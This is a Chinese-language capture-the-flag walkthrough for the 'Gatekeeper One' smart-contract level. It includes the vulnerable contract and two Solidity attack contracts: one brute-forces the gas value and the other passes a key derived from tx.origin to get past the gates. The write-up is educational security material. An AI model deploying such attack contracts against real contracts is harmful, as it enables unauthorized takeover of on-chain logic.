# Gatekeeper One
Gatekeeper One這一關需要我們成爲合約中的entrant，是一個非常考驗綜合知識的一關，有一定的難度，讓我們看一下代碼。

## 合约代碼
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```
## 代碼分析
要成功通過這一關，我們需要通過三個modifier，分別是gateOne, gateTwo, gateThree。

### gateOne
gateOne的要求很簡單，需要msg.sender和tx.origin不同。我們在Telephone那一關其實已經聊過這個問題，只需要使用合約呼叫enter函數即可完成這個要求。

### gateThree
我們先説gateThree，gateThree有三個要求，分別是：
1. uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
2. uint32(uint64(_gateKey)) != uint64(_gateKey)
3. uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)

首先_gatekey是bytes8, 假設uint64(_gateKey)將會是0x12345678abcddcba,(僅用作説明這個十六位進制數的長度)。第一個要求中，先將uint64(_gateKey)做uint32轉換，由於是高位轉低位，所以會保存低位，及0xabcddcba。而將uint64(_gateKey)做uint16轉換，則結果是0xdcba。如果要讓這兩個結果相同，那我們只能將abcd的部分設爲0000。

第二個要求中，需要我們保證經過uint32轉換后的uint64(_gateKey)發生變化，那麽只需要我們在高位的前8個字元不是0即可。

第三個要求中，要求我們先將tx.origin做uint160轉換，因爲是低位轉高位，所以會在高位補0。之後做uint16轉換，是高位轉低位，保留低位后，會得到0xdcba,那麽這個要求其實其實和第一個要求相同，只是明確了我們最低位4個字元的值。

那麽我可以通過AND操作，將tx.orgin轉換為bytes8，然後加上0xFFFFFFFF0000FFFF,就是我們需要輸入的_gatekey。

### gateTwo
需要我們本次交易消耗的gas的剩餘量是可以被8191整除。假設本次交易消耗的gas是n，那麽總共gas設定為8191*x+n，x為任意倍數。我們可以用Remix IDE的debug來測試gasleft的回傳數值。

我們先寫一個簡單的攻擊代碼來進行測試，當然我們也可以使用hardhat的本地測試環境，只是在這裏我們還是用Remix IDE接入測試網來查看。
```
pragma solidity ^0.8.0;
interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attack {
    event Failed (bytes reason, uint256 gas);

    
    function attack(address _target) external {
      IGatekeeperOne target = IGatekeeperOne(_target);
      uint256 gas = 100000;
      for(uint256 i; i< 8191; ++i) {
        gas += 1;

        try target.enter{gas:gas}('0x01'){}
        catch (bytes memory reason) {
          emit Failed(reason, gas);
        }
      }
    }
}
```
根據回傳的log之後，我們可以瞭解到所需要使用的gas。需要注意的是，這個gas會因爲網絡和編譯器版本的不同而有所差異，所以需要自己進行測試。在這裏我們的gas為106739。

## 攻擊代碼
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attack {
    function attack(address target) public {
      bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
      IGatekeeperOne(target).enter{gas:106739}(key);
    }
}
```
## 攻擊過程
1. 部署測試合約，調用attack函數，傳入目標合約地址，交易完成后，從log中獲取我們所需要用的gas
2. 利用找到的gas數值部署攻擊合約，調用attack函數，傳入目標合約地址，任務完成。


